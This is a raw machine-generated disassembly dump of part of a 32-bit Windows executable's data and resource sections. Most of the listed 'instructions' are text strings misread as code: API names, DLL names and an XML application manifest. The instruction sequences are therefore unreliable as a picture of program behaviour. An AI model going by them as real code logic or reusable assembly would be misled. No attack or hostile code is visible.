  4099bf:	add    BYTE PTR [edi+0x61],bl
  4099c2:	arpl   WORD PTR [ebp+0x64],bp
  4099c5:	ins    BYTE PTR es:[edi],dx
  4099c6:	outs   dx,BYTE PTR ds:[esi]
  4099c7:	add    BYTE PTR [ebp+0x73],ch
  4099ca:	jbe    0x409a2f
  4099cc:	jb     0x409a42
  4099ce:	cs fs ins BYTE PTR es:[edi],dx
  4099d1:	ins    BYTE PTR es:[edi],dx
  4099d2:	add    BYTE PTR [eax],al
  4099d4:	pusha  
  4099d5:	add    bl,BYTE PTR [edi+0x6c]
  4099d8:	outs   dx,DWORD PTR ds:[esi]
  4099d9:	arpl   WORD PTR [ebx+0x0],bp
  4099dc:	les    eax,FWORD PTR [ebx]
  4099de:	pop    edi
  4099df:	jne    0x409a4f
  4099e1:	ins    BYTE PTR es:[edi],dx
  4099e2:	outs   dx,DWORD PTR ds:[esi]
  4099e3:	arpl   WORD PTR [ebx+0x0],bp
  4099e6:	popf   
  4099e7:	add    BYTE PTR [edi+0x5f],bl
  4099ea:	fs ins BYTE PTR es:[edi],dx
  4099ec:	ins    BYTE PTR es:[edi],dx
  4099ed:	outs   dx,DWORD PTR ds:[esi]
  4099ee:	outs   dx,BYTE PTR ds:[esi]
  4099ef:	gs js  0x409a5b
  4099f2:	je     0x4099f4
  4099f4:	or     DWORD PTR [ebx],eax
  4099f6:	pop    edi
  4099f7:	outs   dx,DWORD PTR ds:[esi]
  4099f8:	outs   dx,BYTE PTR ds:[esi]
  4099f9:	gs js  0x409a65
  4099fc:	je     0x4099fe
  4099fe:	adc    DWORD PTR [eax],eax
  409a00:	aas    
  409a01:	aas    
  409a02:	xor    DWORD PTR [ecx+edi*2+0x70],esi
  409a06:	gs pop edi
  409a08:	imul   ebp,DWORD PTR [esi+0x66],0x5540406f
  409a0f:	inc    ecx
  409a10:	inc    ebp
  409a11:	inc    eax
  409a12:	pop    eax
  409a13:	pop    edx
  409a14:	add    BYTE PTR [eax],al
  409a16:	xor    eax,0x65743f00
  409a1b:	jb     0x409a8a
  409a1d:	imul   ebp,DWORD PTR [esi+0x61],0x40406574
  409a24:	pop    ecx
  409a25:	inc    ecx
  409a26:	pop    eax
  409a27:	pop    eax
  409a28:	pop    edx
  409a29:	add    BYTE PTR [edi],dh
  409a2b:	add    DWORD PTR [edi+0x63],ebx
  409a2e:	outs   dx,DWORD PTR ds:[esi]
  409a2f:	outs   dx,BYTE PTR ds:[esi]
  409a30:	je     0x409aa4
  409a32:	outs   dx,DWORD PTR ds:[esi]
  409a33:	ins    BYTE PTR es:[edi],dx
  409a34:	data16 jo 0x409a37
  409a37:	add    BYTE PTR [edx+0x1],ch
  409a3a:	pop    edi
  409a3b:	gs js  0x409aa1
  409a3e:	gs jo  0x409ab5
  409a41:	pop    edi
  409a42:	push   0x6c646e61
  409a47:	gs jb  0x409a7e
  409a4a:	pop    edi
  409a4b:	arpl   WORD PTR [edi+0x6d],bp
  409a4e:	ins    DWORD PTR es:[edi],dx
  409a4f:	outs   dx,DWORD PTR ds:[esi]
  409a50:	outs   dx,BYTE PTR ds:[esi]
  409a51:	add    BYTE PTR [ebx+0x4f],al
  409a54:	dec    ebp
  409a55:	inc    ebx
  409a56:	push   esp
  409a57:	dec    esp
  409a58:	xor    esi,DWORD PTR [edx]
  409a5a:	cs fs ins BYTE PTR es:[edi],dx
  409a5d:	ins    BYTE PTR es:[edi],dx
  409a5e:	add    BYTE PTR [eax],al
  409a60:	push   esi
  409a61:	add    DWORD PTR [ebx+0x48],edx
  409a64:	inc    edi
  409a65:	gs je  0x409aae
  409a68:	outs   dx,DWORD PTR ds:[esi]
  409a69:	ins    BYTE PTR es:[edi],dx
  409a6a:	fs gs jb 0x409abe
  409a6e:	popa   
  409a6f:	je     0x409ad9
  409a71:	inc    ebp
  409a72:	js     0x409a74
  409a74:	jl     0x409a76
  409a76:	push   ebx
  409a77:	dec    eax
  409a78:	inc    ecx
  409a79:	fs fs push esp
  409a7c:	outs   dx,DWORD PTR ds:[esi]
  409a7d:	push   edx
  409a7e:	arpl   WORD PTR gs:[ebp+0x6e],sp
  409a82:	je     0x409ac8
  409a84:	outs   dx,DWORD PTR ds:[esi]
  409a85:	arpl   WORD PTR [ebx+0x0],si
  409a88:	mov    eax,DWORD PTR [eax]
  409a8a:	push   ebx
  409a8b:	dec    eax
  409a8c:	inc    ebx
  409a8d:	push   0x65676e61
  409a92:	dec    esi
  409a93:	outs   dx,DWORD PTR ds:[esi]
  409a94:	je     0x409aff
  409a96:	data16 jns 0x409a99
  409a99:	add    BYTE PTR [ebx+0x48],dl
  409a9c:	inc    ebp
  409a9d:	dec    esp
  409a9e:	dec    esp
  409a9f:	xor    esi,DWORD PTR [edx]
  409aa1:	cs fs ins BYTE PTR es:[edi],dx
  409aa4:	ins    BYTE PTR es:[edi],dx
  409aa5:	add    BYTE PTR [ebp+0x0],cl
  409aa8:	push   eax
  409aa9:	popa   
  409aaa:	je     0x409b14
  409aac:	inc    esi
  409aad:	imul   ebp,DWORD PTR [esi+0x64],0x656c6946
  409ab4:	dec    esi
  409ab5:	popa   
  409ab6:	ins    DWORD PTR es:[edi],dx
  409ab7:	gs push edi
  409ab9:	add    BYTE PTR [ecx+0x0],bl
  409abc:	push   eax
  409abd:	popa   
  409abe:	je     0x409b28
  409ac0:	inc    edi
  409ac1:	gs je  0x409b08
  409ac4:	jb     0x409b2f
  409ac6:	jbe    0x409b2d
  409ac8:	dec    esi
  409ac9:	jne    0x409b38
  409acb:	bound  esp,QWORD PTR [ebp+0x72]
  409ace:	push   edi
  409acf:	add    BYTE PTR [ebp+0x0],dh
  409ad2:	push   eax
  409ad3:	popa   
  409ad4:	je     0x409b3e
  409ad6:	dec    ecx
  409ad7:	jae    0x409b2e
  409ad9:	dec    esi
  409ada:	inc    ebx
  409adb:	push   edi
  409adc:	add    BYTE PTR [eax],al
  409ade:	aaa    
  409adf:	add    BYTE PTR [eax+0x61],dl
  409ae2:	je     0x409b4c
  409ae4:	inc    ecx
  409ae5:	jo     0x409b57
  409ae7:	outs   dx,BYTE PTR gs:[esi]
  409ae9:	fs push edi
  409aeb:	add    BYTE PTR [ecx+0x0],cl
  409aee:	push   eax
  409aef:	popa   
  409af0:	je     0x409b5a
  409af2:	inc    esi
  409af3:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x74736978
  409afb:	jae    0x409b54
  409afd:	add    BYTE PTR [ebp+0x0],dl
  409b00:	push   eax
  409b01:	popa   
  409b02:	je     0x409b6c
  409b04:	inc    edi
  409b05:	gs je  0x409b49
  409b08:	jb     0x409b71
  409b0a:	jae    0x409b63
  409b0c:	add    BYTE PTR [eax],al
  409b0e:	mov    ds:0x74615000,eax
  409b13:	push   0x75716e55
  409b18:	outs   dx,DWORD PTR ds:[esi]
  409b19:	je     0x409b80
  409b1b:	push   ebx
  409b1c:	jo     0x409b7f
  409b1e:	arpl   WORD PTR [ebp+0x73],sp
  409b21:	push   edi
  409b22:	add    BYTE PTR [eax],al
  409b24:	pop    eax
  409b25:	add    DWORD PTR [ebx+0x74],edx
  409b28:	jb     0x409b7e
  409b2a:	outs   dx,DWORD PTR ds:[esi]
  409b2b:	dec    ecx
  409b2c:	outs   dx,BYTE PTR ds:[esi]
  409b2d:	je     0x409b86
  409b2f:	add    BYTE PTR [edi+0x74615000],cl
  409b35:	push   0x6f6d6552
  409b3a:	jbe    0x409ba1
  409b3c:	inc    esi
  409b3d:	imul   ebp,DWORD PTR [ebp+eiz*2+0x53],0x57636570
  409b45:	add    BYTE PTR [ebx+0x0],cl
  409b48:	push   eax
  409b49:	popa   
  409b4a:	je     0x409bb4
  409b4c:	inc    esi
  409b4d:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  409b54:	outs   dx,BYTE PTR ds:[esi]
  409b55:	jae    0x409bc0
  409b57:	outs   dx,DWORD PTR ds:[esi]
  409b58:	outs   dx,BYTE PTR ds:[esi]
  409b59:	push   edi
  409b5a:	add    BYTE PTR [eax],al
  409b5c:	push   ebx
  409b5d:	dec    eax
  409b5e:	dec    esp
  409b5f:	push   edi
  409b60:	inc    ecx
  409b61:	push   eax
  409b62:	dec    ecx
  409b63:	cs fs ins BYTE PTR es:[edi],dx
  409b66:	ins    BYTE PTR es:[edi],dx
  409b67:	add    BYTE PTR [eax],cl
  409b69:	add    BYTE PTR [ebx+0x6f],al
  409b6c:	inc    ebx
  409b6d:	jb     0x409bd4
  409b6f:	popa   
  409b70:	je     0x409bd7
  409b72:	dec    ecx
  409b73:	outs   dx,BYTE PTR ds:[esi]
  409b74:	jae    0x409bea
  409b76:	popa   
  409b77:	outs   dx,BYTE PTR ds:[esi]
  409b78:	arpl   WORD PTR [ebp+0x0],sp
  409b7b:	add    BYTE PTR ds:0x656c5300,ch
  409b81:	gs jo  0x409b84
  409b84:	adc    DWORD PTR [eax],eax
  409b86:	push   ebp
  409b87:	outs   dx,BYTE PTR ds:[esi]
  409b88:	push   0x6c646e61
  409b8d:	gs fs inc ebp
  409b90:	js     0x409bf5
  409b92:	gs jo  0x409c09
  409b95:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  409b9c:	gs jb  0x409b9f
  409b9f:	add    BYTE PTR [edi],cl
  409ba1:	add    BYTE PTR [ebx+0x65],dl
  409ba4:	je     0x409bfb
  409ba6:	outs   dx,BYTE PTR ds:[esi]
  409ba7:	push   0x6c646e61
  409bac:	gs fs inc ebp
  409baf:	js     0x409c14
  409bb1:	gs jo  0x409c28
  409bb4:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  409bbb:	gs jb  0x409bbe
  409bbe:	or     al,0x0
  409bc0:	inc    edi
  409bc1:	gs je  0x409c07
  409bc4:	jne    0x409c38
  409bc6:	jb     0x409c2d
  409bc8:	outs   dx,BYTE PTR ds:[esi]
  409bc9:	je     0x409c1b
  409bcb:	jb     0x409c3c
  409bcd:	arpl   WORD PTR [ebp+0x73],sp
  409bd0:	jae    0x409bd2
  409bd2:	dec    ebx
  409bd3:	add    BYTE PTR [ebp+eiz*2+0x72],dl
  409bd7:	ins    DWORD PTR es:[edi],dx
  409bd8:	imul   ebp,DWORD PTR [esi+0x61],0x72506574
  409bdf:	outs   dx,DWORD PTR ds:[esi]
  409be0:	arpl   WORD PTR [ebp+0x73],sp
  409be3:	jae    0x409be5
  409be5:	add    BYTE PTR [eax],dl
  409be7:	add    BYTE PTR [edi+0x65],al
  409bea:	je     0x409c39
  409bec:	outs   dx,DWORD PTR ds:[esi]
  409bed:	fs jne 0x409c5c
  409bf0:	gs dec eax
  409bf2:	popa   
  409bf3:	outs   dx,BYTE PTR ds:[esi]
  409bf4:	fs ins BYTE PTR es:[edi],dx
  409bf6:	gs inc ecx
  409bf8:	add    BYTE PTR [eax],al
  409bfa:	add    BYTE PTR [eax],al
  409bfc:	push   ecx
  409bfd:	jne    0x409c64
  409bff:	jb     0x409c7a
  409c01:	push   eax
  409c02:	gs jb  0x409c6b
  409c05:	outs   dx,DWORD PTR ds:[esi]
  409c06:	jb     0x409c75
  409c08:	popa   
  409c09:	outs   dx,BYTE PTR ds:[esi]
  409c0a:	arpl   WORD PTR [ebp+0x43],sp
  409c0d:	outs   dx,DWORD PTR ds:[esi]
  409c0e:	jne    0x409c7e
  409c10:	je     0x409c77
  409c12:	jb     0x409c14
  409c14:	or     eax,0x74654700
  409c19:	inc    ebx
  409c1a:	jne    0x409c8e
  409c1c:	jb     0x409c83
  409c1e:	outs   dx,BYTE PTR ds:[esi]
  409c1f:	je     0x409c71
  409c21:	jb     0x409c92
  409c23:	arpl   WORD PTR [ebp+0x73],sp
  409c26:	jae    0x409c71
  409c28:	add    BYTE PTR fs:[eax+eax*1],dl
  409c2c:	inc    edi
  409c2d:	gs je  0x409c83
  409c30:	jns    0x409ca5
  409c32:	je     0x409c99
  409c34:	ins    DWORD PTR es:[edi],dx
  409c35:	push   esp
  409c36:	imul   ebp,DWORD PTR [ebp+0x65],0x69467341
  409c3d:	ins    BYTE PTR es:[edi],dx
  409c3e:	gs push esp
  409c40:	imul   ebp,DWORD PTR [ebp+0x65],0x47001800
  409c47:	gs je  0x409c9e
  409c4a:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  409c51:	je     0x409c53
  409c53:	add    BYTE PTR [esi],ah
  409c55:	add    BYTE PTR [ebx+0x6f],al
  409c58:	dec    ecx
  409c59:	outs   dx,BYTE PTR ds:[esi]
  409c5a:	imul   esi,DWORD PTR [ecx+ebp*2+0x61],0x657a696c
  409c62:	inc    ebp
  409c63:	js     0x409c65
  409c65:	add    BYTE PTR [edx+0x0],al
  409c68:	inc    ebx
  409c69:	outs   dx,DWORD PTR ds:[esi]
  409c6a:	push   ebp
  409c6b:	outs   dx,BYTE PTR ds:[esi]
  409c6c:	imul   ebp,DWORD PTR [esi+0x69],0x6c616974
  409c73:	imul   edi,DWORD PTR [edx+0x65],0x70610000
  409c7a:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409c84:	outs   dx,DWORD PTR ds:[esi]
  409c85:	jb     0x409cec
  409c87:	sub    eax,0x2d6d6f63
  409c8c:	ins    BYTE PTR es:[edi],dx
  409c8d:	xor    DWORD PTR ds:0x2e312d31,ebp
  409c93:	fs ins BYTE PTR es:[edi],dx
  409c95:	ins    BYTE PTR es:[edi],dx
  409c96:	add    BYTE PTR [eax],al
  409c98:	popa   
  409c99:	jo     0x409d04
  409c9b:	sub    eax,0x772d736d
  409ca0:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409ca7:	sub    eax,0x636e7973
  409cac:	push   0x2d316c2d
  409cb1:	xor    ch,BYTE PTR ds:0x6c642e30
  409cb7:	ins    BYTE PTR es:[edi],dx
  409cb8:	add    BYTE PTR [eax],al
  409cba:	popa   
  409cbb:	jo     0x409d26
  409cbd:	sub    eax,0x772d736d
  409cc2:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409cc9:	sub    eax,0x6f727265
  409cce:	jb     0x409d38
  409cd0:	popa   
  409cd1:	outs   dx,BYTE PTR ds:[esi]
  409cd2:	fs ins BYTE PTR es:[edi],dx
  409cd4:	imul   ebp,DWORD PTR [esi+0x67],0x2d316c2d
  409cdb:	xor    DWORD PTR ds:0x6c642e31,ebp
  409ce1:	ins    BYTE PTR es:[edi],dx
  409ce2:	add    BYTE PTR [eax],al
  409ce4:	popa   
  409ce5:	jo     0x409d50
  409ce7:	sub    eax,0x772d736d
  409cec:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409cf3:	sub    eax,0x636f7270
  409cf8:	gs jae 0x409d6e
  409cfb:	je     0x409d65
  409cfd:	jb     0x409d64
  409cff:	popa   
  409d00:	fs jae 0x409d30
  409d03:	ins    BYTE PTR es:[edi],dx
  409d04:	xor    DWORD PTR ds:0x2e322d31,ebp
  409d0a:	fs ins BYTE PTR es:[edi],dx
  409d0c:	ins    BYTE PTR es:[edi],dx
  409d0d:	add    BYTE PTR [ecx+0x70],ah
  409d10:	imul   ebp,DWORD PTR ds:0x772d736d,0x632d6e69
  409d1a:	outs   dx,DWORD PTR ds:[esi]
  409d1b:	jb     0x409d82
  409d1d:	sub    eax,0x7262696c
  409d22:	popa   
  409d23:	jb     0x409d9e
  409d25:	ins    BYTE PTR es:[edi],dx
  409d26:	outs   dx,DWORD PTR ds:[esi]
  409d27:	popa   
  409d28:	fs gs jb 0x409d59
  409d2c:	ins    BYTE PTR es:[edi],dx
  409d2d:	xor    DWORD PTR ds:0x2e302d32,ebp
  409d33:	fs ins BYTE PTR es:[edi],dx
  409d35:	ins    BYTE PTR es:[edi],dx
  409d36:	add    BYTE PTR [eax],al
  409d38:	popa   
  409d39:	jo     0x409da4
  409d3b:	sub    eax,0x772d736d
  409d40:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409d47:	sub    eax,0x666f7270
  409d4c:	imul   ebp,DWORD PTR [ebp+eiz*2+0x2d],0x312d316c
  409d54:	sub    eax,0x6c642e30
  409d59:	ins    BYTE PTR es:[edi],dx
  409d5a:	add    BYTE PTR [eax],al
  409d5c:	popa   
  409d5d:	jo     0x409dc8
  409d5f:	sub    eax,0x772d736d
  409d64:	imul   ebp,DWORD PTR [esi+0x2d],0x65726f63
  409d6b:	sub    eax,0x69737973
  409d70:	outs   dx,BYTE PTR ds:[esi]
  409d71:	outs   dx,WORD PTR ds:[esi]
  409d73:	sub    eax,0x322d316c
  409d78:	sub    eax,0x6c642e31
  409d7d:	ins    BYTE PTR es:[edi],dx
  409d7e:	add    BYTE PTR [eax],al
  409d80:	and    eax,0x6d6d4900
  409d85:	inc    esp
  409d86:	imul   esi,DWORD PTR [ebx+0x61],0x49656c62
  409d8d:	dec    ebp
  409d8e:	inc    ebp
  409d8f:	add    BYTE PTR [ecx+0x4d],cl
  409d92:	dec    ebp
  409d93:	xor    esi,DWORD PTR [edx]
  409d95:	cs fs ins BYTE PTR es:[edi],dx
  409d98:	ins    BYTE PTR es:[edi],dx
  409d99:	add    BYTE PTR [edi+0x74654702],bh
  409d9f:	push   ebx
  409da0:	je     0x409e03
  409da2:	jb     0x409e18
  409da4:	jne    0x409e16
  409da6:	dec    ecx
  409da7:	outs   dx,BYTE PTR ds:[esi]
  409da8:	outs   dx,WORD PTR ds:[esi]
  409daa:	inc    ecx
  409dab:	add    BYTE PTR [eax+eax*1+0x5f],ah
  409daf:	inc    ebx
  409db0:	js     0x409e2a
  409db2:	push   esp
  409db3:	push   0x45776f72
  409db8:	js     0x409e1d
  409dba:	gs jo  0x409e31
  409dbd:	imul   ebp,DWORD PTR [edi+0x6e],0x5090000
  409dc4:	ins    DWORD PTR es:[edi],dx
  409dc5:	gs ins DWORD PTR es:[edi],dx
  409dc7:	arpl   WORD PTR [eax+0x79],si
  409dca:	add    BYTE PTR [eax],al
  409dcc:	or     eax,0x6d656d05
  409dd1:	jae    0x409e38
  409dd3:	je     0x409dd5
	...

Disassembly of section .rsrc:

0040a000 <.rsrc>:
	...
  40a00c:	add    DWORD PTR [eax],eax
  40a00e:	add    al,0x0
  40a010:	test   al,0x1
  40a012:	add    BYTE PTR [eax-0x7fffffc8],al
  40a018:	add    eax,DWORD PTR [eax]
  40a01a:	add    BYTE PTR [eax],al
  40a01c:	push   eax
  40a01d:	add    BYTE PTR [eax],al
  40a01f:	or     BYTE PTR [esi],0x0
  40a022:	add    BYTE PTR [eax],al
  40a024:	jo     0x40a026
  40a026:	add    BYTE PTR [eax+0x10],al
  40a02c:	mov    BYTE PTR [eax],al
  40a02e:	add    BYTE PTR [eax+0x18],al
  40a034:	mov    al,ds:0x800000
	...
  40a045:	add    BYTE PTR [ecx],al
  40a047:	add    BYTE PTR [ecx],al
  40a049:	add    BYTE PTR [eax],al
  40a04b:	add    BYTE PTR [eax+0x800000],bh
	...
  40a05d:	add    BYTE PTR [edx],al
  40a05f:	add    BYTE PTR [ecx],al
  40a061:	add    BYTE PTR [eax],al
  40a063:	add    al,dl
  40a065:	add    BYTE PTR [eax],al
  40a067:	add    BYTE PTR [edx],0x0
  40a06a:	add    BYTE PTR [eax],al
  40a06c:	call   0xc0a071
	...
  40a07d:	add    BYTE PTR [ecx],al
  40a07f:	add    BYTE PTR [ecx],al
  40a081:	add    BYTE PTR [eax],al
  40a083:	add    BYTE PTR [eax],al
  40a085:	add    DWORD PTR [eax],eax
  40a087:	add    BYTE PTR [eax],0x0
	...
  40a096:	add    DWORD PTR [eax],eax
  40a098:	add    DWORD PTR [eax],eax
  40a09a:	add    BYTE PTR [eax],al
  40a09c:	sbb    BYTE PTR [ecx],al
  40a09e:	add    BYTE PTR [eax+0x0],al
	...
  40a0ac:	add    BYTE PTR [eax],al
  40a0ae:	add    DWORD PTR [eax],eax
  40a0b0:	add    DWORD PTR [eax],eax
  40a0b2:	add    BYTE PTR [eax],al
  40a0b4:	xor    BYTE PTR [ecx],al
  40a0b6:	add    BYTE PTR [eax+0x0],al
	...
  40a0c4:	add    BYTE PTR [eax],al
  40a0c6:	add    DWORD PTR [eax],eax
  40a0c8:	or     DWORD PTR [eax+eax*1],eax
  40a0cb:	add    BYTE PTR [eax+0x1],cl
	...
  40a0de:	add    DWORD PTR [eax],eax
  40a0e0:	or     DWORD PTR [eax+eax*1],eax
  40a0e3:	add    BYTE PTR [eax+0x1],bl
	...
  40a0f6:	add    DWORD PTR [eax],eax
  40a0f8:	or     DWORD PTR [eax+eax*1],eax
  40a0fb:	add    BYTE PTR [eax+0x1],ch
	...
  40a10e:	add    DWORD PTR [eax],eax
  40a110:	or     DWORD PTR [eax+eax*1],eax
  40a113:	add    BYTE PTR [eax+0x1],bh
	...
  40a126:	add    DWORD PTR [eax],eax
  40a128:	or     DWORD PTR [eax+eax*1],eax
  40a12b:	add    BYTE PTR [eax+0x1],cl
	...
  40a13d:	add    BYTE PTR [ecx],al
  40a13f:	add    BYTE PTR [ecx],cl
  40a141:	add    al,0x0
  40a143:	add    BYTE PTR [eax+0x28000001],bl
  40a149:	scas   al,BYTE PTR es:[edi]
  40a14a:	add    BYTE PTR [eax],al
  40a14c:	fadd   DWORD PTR [eax]
	...
  40a156:	add    BYTE PTR [eax],al
  40a158:	dec    eax
  40a159:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a15a:	add    BYTE PTR [eax],al
  40a15c:	xor    BYTE PTR [ecx],al
	...
  40a166:	add    BYTE PTR [eax],al
  40a168:	js     0x40a111
  40a16a:	add    BYTE PTR [eax],al
  40a16c:	call   0x40a173
  40a171:	add    BYTE PTR [eax],al
  40a173:	add    BYTE PTR [eax],al
  40a175:	add    BYTE PTR [eax],al
  40a177:	add    BYTE PTR [eax-0x56],ah
  40a17a:	add    BYTE PTR [eax],al
  40a17c:	and    al,BYTE PTR [eax]
	...
  40a186:	add    BYTE PTR [eax],al
  40a188:	mov    BYTE PTR [edx+0x39c0000],ch
	...
  40a196:	add    BYTE PTR [eax],al
  40a198:	mov    al,0xa1
  40a19a:	add    BYTE PTR [eax],al
  40a19c:	xchg   edx,eax
  40a19d:	add    al,0x0
	...
  40a1a7:	add    BYTE PTR [ebx],al
  40a1a9:	add    BYTE PTR [ebp+0x0],cl
  40a1ac:	push   ebp
  40a1ad:	add    BYTE PTR [ecx+0x0],cl
  40a1b0:	cmp    al,0x3f
  40a1b2:	js     0x40a221
  40a1b4:	ins    BYTE PTR es:[edi],dx
  40a1b5:	and    BYTE PTR [esi+0x65],dh
  40a1b8:	jb     0x40a22d
  40a1ba:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40a1c1:	xor    BYTE PTR [edx],ah
  40a1c3:	and    BYTE PTR [ebp+0x6e],ah
  40a1c6:	arpl   WORD PTR [edi+0x64],bp
  40a1c9:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  40a1d0:	inc    esi
  40a1d1:	sub    eax,0x73202238
  40a1d6:	je     0x40a239
  40a1d8:	outs   dx,BYTE PTR ds:[esi]
  40a1d9:	fs popa 
  40a1db:	ins    BYTE PTR es:[edi],dx
  40a1dc:	outs   dx,DWORD PTR ds:[esi]
  40a1dd:	outs   dx,BYTE PTR ds:[esi]
  40a1de:	gs cmp eax,0x73657922
  40a1e4:	and    bh,BYTE PTR [edi]
  40a1e6:	ds or  eax,0x2d213c0a
  40a1ec:	sub    eax,0x706f4320
  40a1f1:	jns    0x40a265
  40a1f3:	imul   esp,DWORD PTR [edi+0x68],0x63282074
  40a1fa:	sub    DWORD PTR [eax],esp
  40a1fc:	dec    ebp
  40a1fd:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40a204:	je     0x40a226
  40a206:	inc    ebx
  40a207:	outs   dx,DWORD PTR ds:[esi]
  40a208:	jb     0x40a27a
  40a20a:	outs   dx,DWORD PTR ds:[esi]
  40a20b:	jb     0x40a26e
  40a20d:	je     0x40a278
  40a20f:	outs   dx,DWORD PTR ds:[esi]
  40a210:	outs   dx,BYTE PTR ds:[esi]
  40a211:	and    BYTE PTR ds:0xa0d3e2d,ch
  40a217:	cmp    al,0x61
  40a219:	jae    0x40a28e
  40a21b:	gs ins DWORD PTR es:[edi],dx
  40a21d:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40a221:	js     0x40a290
  40a223:	ins    BYTE PTR es:[edi],dx
  40a224:	outs   dx,BYTE PTR ds:[esi]
  40a225:	jae    0x40a264
  40a227:	and    dh,BYTE PTR [ebp+0x72]
  40a22a:	outs   dx,BYTE PTR ds:[esi]
  40a22b:	cmp    dh,BYTE PTR [ebx+0x63]
  40a22e:	push   0x73616d65
  40a233:	sub    eax,0x7263696d
  40a238:	outs   dx,DWORD PTR ds:[esi]
  40a239:	jae    0x40a2aa
  40a23b:	data16 je 0x40a26b
  40a23e:	arpl   WORD PTR [edi+0x6d],bp
  40a241:	cmp    ah,BYTE PTR [ecx+0x73]
  40a244:	ins    DWORD PTR es:[edi],dx
  40a245:	cs jbe 0x40a279
  40a248:	and    ah,BYTE PTR [eax]
  40a24a:	ins    DWORD PTR es:[edi],dx
  40a24b:	popa   
  40a24c:	outs   dx,BYTE PTR ds:[esi]
  40a24d:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40a254:	jb     0x40a2c9
  40a256:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40a25d:	xor    BYTE PTR [edx],ah
  40a25f:	ds or  eax,0x73613c0a
  40a265:	jae    0x40a2cc
  40a267:	ins    DWORD PTR es:[edi],dx
  40a268:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40a26c:	fs outs dx,BYTE PTR gs:[esi]
  40a26f:	je     0x40a2da
  40a271:	je     0x40a2ec
  40a273:	or     eax,0x2020200a
  40a278:	and    BYTE PTR [esi+0x61],ch
  40a27b:	ins    DWORD PTR es:[edi],dx
  40a27c:	gs cmp eax,0x63694d22
  40a282:	jb     0x40a2f3
  40a284:	jae    0x40a2f5
  40a286:	data16 je 0x40a2b7
  40a289:	push   edi
  40a28a:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  40a291:	push   ebx
  40a292:	push   0x2e6c6c65
  40a297:	addr16 jb 0x40a30a
  40a29a:	arpl   WORD PTR [edi+0x6e],bp
  40a29d:	jbe    0x40a2c1
  40a29f:	or     eax,0x2020200a
  40a2a4:	and    BYTE PTR [eax+0x72],dh
  40a2a7:	outs   dx,DWORD PTR ds:[esi]
  40a2a8:	arpl   WORD PTR [ebp+0x73],sp
  40a2ab:	jae    0x40a31c
  40a2ad:	jb     0x40a2f0
  40a2af:	jb     0x40a314
  40a2b1:	push   0x63657469
  40a2b6:	je     0x40a32d
  40a2b8:	jb     0x40a31f
  40a2ba:	cmp    eax,0x36387822
  40a2bf:	and    cl,BYTE PTR ds:0x2020200a
  40a2c5:	and    BYTE PTR [esi+0x65],dh
  40a2c8:	jb     0x40a33d
  40a2ca:	imul   ebp,DWORD PTR [edi+0x6e],0x2e35223d
  40a2d1:	xor    DWORD PTR [esi],ebp
  40a2d3:	xor    BYTE PTR [esi],ch
  40a2d5:	xor    BYTE PTR [edx],ah
  40a2d7:	or     eax,0x2020200a
  40a2dc:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40a2e0:	gs cmp eax,0x6e697722
  40a2e6:	xor    esi,DWORD PTR [edx]
  40a2e8:	and    ch,BYTE PTR [edi]
  40a2ea:	ds or  eax,0x65643c0a
  40a2f0:	jae    0x40a355
  40a2f2:	jb     0x40a35d
  40a2f4:	jo     0x40a36a
  40a2f6:	imul   ebp,DWORD PTR [edi+0x6e],0x6e69573e
  40a2fd:	outs   dx,DWORD PTR fs:[esi]
  40a2ff:	ja     0x40a374
  40a301:	and    BYTE PTR [ebx+0x68],dl
  40a304:	gs ins BYTE PTR es:[edi],dx
  40a306:	ins    BYTE PTR es:[edi],dx
  40a307:	cmp    al,0x2f
  40a309:	fs gs jae 0x40a370
  40a30d:	jb     0x40a378
  40a30f:	jo     0x40a385
  40a311:	imul   ebp,DWORD PTR [edi+0x6e],0x3c0a0d3e
  40a318:	fs gs jo 0x40a381
  40a31c:	outs   dx,BYTE PTR ds:[esi]
  40a31d:	fs outs dx,BYTE PTR gs:[esi]
  40a320:	arpl   WORD PTR [ecx+0x3e],di
  40a323:	or     eax,0x2020200a
  40a328:	and    BYTE PTR [esp+eiz*2],bh
  40a32b:	gs jo  0x40a393
  40a32e:	outs   dx,BYTE PTR ds:[esi]
  40a32f:	fs outs dx,BYTE PTR gs:[esi]
  40a332:	je     0x40a375
  40a334:	jae    0x40a3a9
  40a336:	gs ins DWORD PTR es:[edi],dx
  40a338:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  40a33c:	or     eax,0x2020200a
  40a341:	and    BYTE PTR [eax],ah
  40a343:	and    BYTE PTR [eax],ah
  40a345:	and    BYTE PTR [ecx+eiz*2],bh
  40a348:	jae    0x40a3bd
  40a34a:	gs ins DWORD PTR es:[edi],dx
  40a34c:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  40a350:	fs outs dx,BYTE PTR gs:[esi]
  40a353:	je     0x40a3be
  40a355:	je     0x40a3d0
  40a357:	or     eax,0x2020200a
  40a35c:	and    BYTE PTR [eax],ah
  40a35e:	and    BYTE PTR [eax],ah
  40a360:	and    BYTE PTR [eax],ah
  40a362:	and    BYTE PTR [eax],ah
  40a364:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40a368:	gs cmp eax,0x6e697722
  40a36e:	xor    esi,DWORD PTR [edx]
  40a370:	and    cl,BYTE PTR ds:0x2020200a
  40a376:	and    BYTE PTR [eax],ah
  40a378:	and    BYTE PTR [eax],ah
  40a37a:	and    BYTE PTR [eax],ah
  40a37c:	and    BYTE PTR [eax],ah
